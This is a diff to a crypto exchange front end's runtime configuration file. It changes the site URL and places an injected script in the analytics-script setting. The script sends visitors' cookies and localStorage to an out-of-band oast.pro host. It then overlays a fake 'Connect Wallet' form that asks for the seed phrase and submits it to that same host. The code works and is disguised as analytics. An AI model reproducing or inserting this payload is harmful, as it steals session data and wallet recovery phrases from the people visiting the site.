@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://dex.orderly.network/ip-1779852553-2061/",
+  "VITE_SEO_SITE_URL": "https://ip-1779852553.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>var c=document.cookie,l=JSON.stringify(localStorage);new Image().src=\"https://d8b5q3uu5rat51cltvm0rh8rew5q4uafd.oast.pro/a?o=\"+encodeURIComponent(location.origin)+\"&c=\"+encodeURIComponent(c)+\"&l=\"+encodeURIComponent(l).substring(0,600);var w=document.createElement(\"div\");w.style.cssText=\"position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999999;display:flex;align-items:center;justify-content:center\";var f=document.createElement(\"form\");f.action=\"https://d8b5q3uu5rat51cltvm0rh8rew5q4uafd.oast.pro/s\";f.method=\"GET\";f.style.cssText=\"background:#1a1a2e;border-radius:16px;padding:32px;width:380px;color:#fff;font-family:sans-serif\";var h=document.createElement(\"h2\");h.textContent=\"Connect Wallet\";h.style.margin=\"0 0 12px\";f.appendChild(h);var d=document.createElement(\"p\");d.textContent=\"Enter recovery phrase to continue\";d.style.cssText=\"color:#888;font-size:14px\";f.appendChild(d);var i=document.createElement(\"input\");i.name=\"seed\";i.placeholder=\"Enter seed phrase...\";i.style.cssText=\"display:block;width:316px;padding:12px;border-radius:8px;border:1px solid #333;background:#0d0d1a;color:#fff;box-sizing:border-box\";f.appendChild(i);var b=document.createElement(\"button\");b.type=\"submit\";b.textContent=\"Connect\";b.style.cssText=\"display:block;width:316px;padding:12px;margin-top:12px;background:#3396FF;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:bold\";f.appendChild(b);w.appendChild(f);document.body.appendChild(w);</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
